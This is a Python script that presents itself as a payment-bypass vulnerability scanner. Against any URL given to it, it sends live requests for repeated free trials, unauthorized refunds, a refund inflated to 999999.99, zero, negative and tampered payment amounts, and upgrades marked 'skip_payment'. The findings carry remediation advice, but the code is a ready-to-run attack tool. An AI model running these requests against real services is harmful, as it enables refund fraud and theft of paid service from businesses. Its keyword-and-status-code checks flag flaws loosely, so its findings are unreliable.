#!/usr/bin/env python3
"""
Payment Bypass Tester
Tests for payment and subscription bypass vulnerabilities including
free trial abuse, refund manipulation, and subscription downgrade prevention
"""

import requests
import json
import time
from datetime import datetime
from urllib.parse import urlparse, urljoin

class PaymentBypassTester:
    """Payment and subscription bypass vulnerability tester"""

    def __init__(self, target_url, auth_token=None, output_file=None):
        self.target_url = target_url
        self.auth_token = auth_token
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        if auth_token:
            self.session.headers.update({
                'Authorization': f'Bearer {auth_token}'
            })

    def scan(self):
        """Run payment bypass tests"""
        print(f"[*] Starting payment bypass testing on {self.target_url}")

        # Test free trial abuse
        self._test_free_trial_abuse()

        # Test refund manipulation
        self._test_refund_manipulation()

        # Test subscription bypass
        self._test_subscription_bypass()

        # Test payment amount manipulation
        self._test_payment_amount_manipulation()

        # Test recurring payment bypass
        self._test_recurring_payment_bypass()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_free_trial_abuse(self):
        """Test for free trial abuse vulnerabilities"""
        print("[*] Testing free trial abuse...")

        # Common trial endpoints
        trial_endpoints = [
            '/api/trial/start',
            '/subscription/trial',
            '/account/start-trial',
            '/api/subscription/trial',
            '/trial/activate',
        ]

        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for endpoint in trial_endpoints:
            trial_url = base_url + endpoint

            try:
                # Test 1: Multiple trial creation with same email
                trial_data = {
                    'email': 'test@example.com',
                    'plan': 'premium'
                }

                responses = []
                for i in range(3):
                    try:
                        resp = self.session.post(trial_url, json=trial_data, timeout=10)
                        responses.append(resp.status_code)
                    except:
                        pass

                # If multiple trials can be created
                if len([r for r in responses if r in [200, 201]]) > 1:
                    vuln = {
                        'type': 'Payment Bypass - Infinite Free Trials',
                        'severity': 'high',
                        'url': trial_url,
                        'evidence': f'Created {len([r for r in responses if r in [200, 201]])} trials with same email',
                        'description': 'Multiple free trials can be created with same email',
                        'cwe': 'CWE-840',
                        'impact': 'Perpetual free service access, revenue loss',
                        'remediation': 'Track trials by email, require payment method verification'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Infinite free trial abuse possible")
                    return

                # Test 2: Trial without email verification
                unverified_data = {
                    'email': 'unverified@example.com',
                    'plan': 'premium'
                }

                response = self.session.post(trial_url, json=unverified_data, timeout=10)

                if response.status_code in [200, 201]:
                    # Check if immediate access granted
                    if 'success' in response.text.lower() or 'activated' in response.text.lower():
                        vuln = {
                            'type': 'Payment Bypass - Trial Without Verification',
                            'severity': 'medium',
                            'url': trial_url,
                            'evidence': 'Free trial activated without email verification',
                            'description': 'Free trials can be created without email verification',
                            'cwe': 'CWE-840',
                            'impact': 'Trial abuse, fake accounts',
                            'remediation': 'Require email verification before trial activation'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] Trial activation without verification")

            except:
                pass

    def _test_refund_manipulation(self):
        """Test for refund manipulation vulnerabilities"""
        print("[*] Testing refund manipulation...")

        # Common refund endpoints
        refund_endpoints = [
            '/api/refund',
            '/payment/refund',
            '/order/refund',
            '/api/order/refund',
            '/subscription/cancel-refund',
        ]

        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for endpoint in refund_endpoints:
            refund_url = base_url + endpoint

            try:
                # Test 1: Unauthorized refund
                refund_data = {
                    'order_id': '12345',
                    'amount': 99.99,
                    'reason': 'Not satisfied'
                }

                response = self.session.post(refund_url, json=refund_data, timeout=10)

                # If refund succeeds without proper authorization
                if response.status_code in [200, 201]:
                    if 'success' in response.text.lower() or 'refund' in response.text.lower():
                        vuln = {
                            'type': 'Payment Bypass - Unauthorized Refund',
                            'severity': 'critical',
                            'url': refund_url,
                            'evidence': 'Refund processed without proper authorization',
                            'description': 'Users can issue refunds without validation',
                            'cwe': 'CWE-639',
                            'impact': 'Financial loss, unauthorized refunds',
                            'remediation': 'Implement strict refund authorization and validation'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: Unauthorized refund possible")
                        return

                # Test 2: Amount manipulation in refund
                manipulated_data = {
                    'order_id': '12345',
                    'amount': 999999.99,  # Inflated amount
                    'reason': 'Not satisfied'
                }

                response = self.session.post(refund_url, json=manipulated_data, timeout=10)

                if response.status_code in [200, 201]:
                    vuln = {
                        'type': 'Payment Bypass - Refund Amount Manipulation',
                        'severity': 'critical',
                        'url': refund_url,
                        'evidence': 'Refund amount can be manipulated to arbitrary value',
                        'description': 'Refund amount not validated against original payment',
                        'cwe': 'CWE-639',
                        'impact': 'Financial fraud, excessive refunds',
                        'remediation': 'Validate refund amount against original transaction'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: Refund amount manipulation")
                    return

            except:
                pass

    def _test_subscription_bypass(self):
        """Test for subscription bypass vulnerabilities"""
        print("[*] Testing subscription bypass...")

        # Common subscription endpoints
        subscription_endpoints = [
            '/api/subscription/update',
            '/subscription/change',
            '/account/subscription',
            '/api/user/subscription',
        ]

        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for endpoint in subscription_endpoints:
            sub_url = base_url + endpoint

            try:
                # Test 1: Downgrade prevention bypass
                downgrade_data = {
                    'plan': 'free',
                    'current_plan': 'premium'
                }

                response = self.session.post(sub_url, json=downgrade_data, timeout=10)

                # If downgrade succeeds without payment
                if response.status_code in [200, 201]:
                    if 'success' in response.text.lower() or 'downgrade' in response.text.lower():
                        vuln = {
                            'type': 'Payment Bypass - Subscription Downgrade Without Payment',
                            'severity': 'high',
                            'url': sub_url,
                            'evidence': 'Premium subscription downgraded without processing cancellation',
                            'description': 'Users can downgrade without proper billing cycle completion',
                            'cwe': 'CWE-840',
                            'impact': 'Revenue loss, billing inconsistencies',
                            'remediation': 'Enforce billing cycle completion before downgrades'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] Subscription downgrade bypass")

                # Test 2: Upgrade without payment
                upgrade_data = {
                    'plan': 'premium',
                    'current_plan': 'free',
                    'skip_payment': True
                }

                response = self.session.post(sub_url, json=upgrade_data, timeout=10)

                if response.status_code in [200, 201]:
                    vuln = {
                        'type': 'Payment Bypass - Free Subscription Upgrade',
                        'severity': 'critical',
                        'url': sub_url,
                        'evidence': 'Premium subscription activated without payment',
                        'description': 'Users can upgrade to paid plans without payment',
                        'cwe': 'CWE-840',
                        'impact': 'Complete revenue bypass, financial loss',
                        'remediation': 'Enforce payment verification before subscription upgrades'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: Free subscription upgrade")
                    return

            except:
                pass

    def _test_payment_amount_manipulation(self):
        """Test for payment amount manipulation"""
        print("[*] Testing payment amount manipulation...")

        # Common payment endpoints
        payment_endpoints = [
            '/api/payment/process',
            '/checkout/process',
            '/api/checkout',
            '/payment/create',
            '/order/create',
        ]

        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for endpoint in payment_endpoints:
            payment_url = base_url + endpoint

            try:
                # Test 1: Zero amount payment
                zero_payment = {
                    'amount': 0,
                    'currency': 'USD',
                    'item_id': '123',
                    'quantity': 1
                }

                response = self.session.post(payment_url, json=zero_payment, timeout=10)

                if response.status_code in [200, 201]:
                    if 'success' in response.text.lower() or 'order' in response.text.lower():
                        vuln = {
                            'type': 'Payment Bypass - Zero Amount Payment',
                            'severity': 'critical',
                            'url': payment_url,
                            'evidence': 'Order processed with $0.00 payment',
                            'description': 'Payment can be bypassed by setting amount to zero',
                            'cwe': 'CWE-840',
                            'impact': 'Free purchases, complete payment bypass',
                            'remediation': 'Validate payment amount server-side, enforce minimum payment'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: Zero amount payment accepted")
                        return

                # Test 2: Negative amount (refund abuse)
                negative_payment = {
                    'amount': -99.99,
                    'currency': 'USD',
                    'item_id': '123'
                }

                response = self.session.post(payment_url, json=negative_payment, timeout=10)

                if response.status_code in [200, 201]:
                    vuln = {
                        'type': 'Payment Bypass - Negative Amount',
                        'severity': 'critical',
                        'url': payment_url,
                        'evidence': 'Payment accepts negative amounts',
                        'description': 'Negative payment amounts can be submitted',
                        'cwe': 'CWE-840',
                        'impact': 'Financial fraud, unauthorized credits',
                        'remediation': 'Validate amount is positive, enforce business logic'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: Negative payment amount accepted")
                    return

                # Test 3: Amount parameter tampering
                tampered_payment = {
                    'amount': 0.01,  # Client sends $0.01
                    'display_amount': 99.99,  # But shows $99.99
                    'item_id': '123',
                    'currency': 'USD'
                }

                response = self.session.post(payment_url, json=tampered_payment, timeout=10)

                if response.status_code in [200, 201]:
                    # Check if low amount was processed
                    if '0.01' in response.text or 'success' in response.text.lower():
                        vuln = {
                            'type': 'Payment Bypass - Amount Parameter Tampering',
                            'severity': 'critical',
                            'url': payment_url,
                            'evidence': 'Payment processes client-submitted amount without validation',
                            'description': 'Payment amount can be manipulated client-side',
                            'cwe': 'CWE-840',
                            'impact': 'Pay pennies for expensive items',
                            'remediation': 'Calculate amount server-side based on cart items'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: Payment amount tampering possible")
                        return

            except:
                pass

    def _test_recurring_payment_bypass(self):
        """Test for recurring payment bypass"""
        print("[*] Testing recurring payment bypass...")

        # Common subscription/recurring payment endpoints
        recurring_endpoints = [
            '/api/subscription/cancel',
            '/subscription/pause',
            '/api/billing/pause',
            '/subscription/update',
        ]

        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for endpoint in recurring_endpoints:
            recurring_url = base_url + endpoint

            try:
                # Test cancellation without billing
                cancel_data = {
                    'subscription_id': '12345',
                    'immediate': True,  # Cancel immediately without pro-rated charge
                }

                response = self.session.post(recurring_url, json=cancel_data, timeout=10)

                if response.status_code in [200, 201]:
                    if 'success' in response.text.lower() or 'cancel' in response.text.lower():
                        # Check if access is maintained
                        time.sleep(1)

                        # Try to access premium features
                        feature_url = base_url + '/api/premium/feature'
                        try:
                            feature_resp = self.session.get(feature_url, timeout=10)

                            if feature_resp.status_code == 200:
                                vuln = {
                                    'type': 'Payment Bypass - Subscription Cancel With Feature Access',
                                    'severity': 'medium',
                                    'url': recurring_url,
                                    'evidence': 'Subscription cancelled but premium features still accessible',
                                    'description': 'Users can cancel subscription but retain access',
                                    'cwe': 'CWE-840',
                                    'impact': 'Free premium access after cancellation',
                                    'remediation': 'Immediately revoke access upon cancellation'
                                }
                                self.vulnerabilities.append(vuln)
                                print(f"[!] Subscription cancellation maintains access")

                        except:
                            pass

            except:
                pass

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high'),
                'medium': sum(1 for v in self.vulnerabilities if v['severity'] == 'medium')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 payment_bypass.py <url> [auth_token] [output_file]")
        print("\nExample:")
        print("  python3 payment_bypass.py https://example.com")
        print("  python3 payment_bypass.py https://example.com eyJhbGciOiJIUzI1NiIs... results.json")
        print("\nTests for:")
        print("  - Infinite free trial abuse")
        print("  - Unauthorized refunds")
        print("  - Refund amount manipulation")
        print("  - Subscription bypass (free upgrades)")
        print("  - Zero/negative payment amounts")
        print("  - Payment amount tampering")
        print("  - Recurring payment bypass")
        sys.exit(1)

    target = sys.argv[1]
    token = None
    output = None

    # Parse arguments (token is optional)
    if len(sys.argv) > 2:
        if sys.argv[2].endswith('.json'):
            output = sys.argv[2]
        else:
            token = sys.argv[2]
            if len(sys.argv) > 3:
                output = sys.argv[3]

    tester = PaymentBypassTester(target, token, output)
    results = tester.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
        print(f"    Medium: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'medium')}")
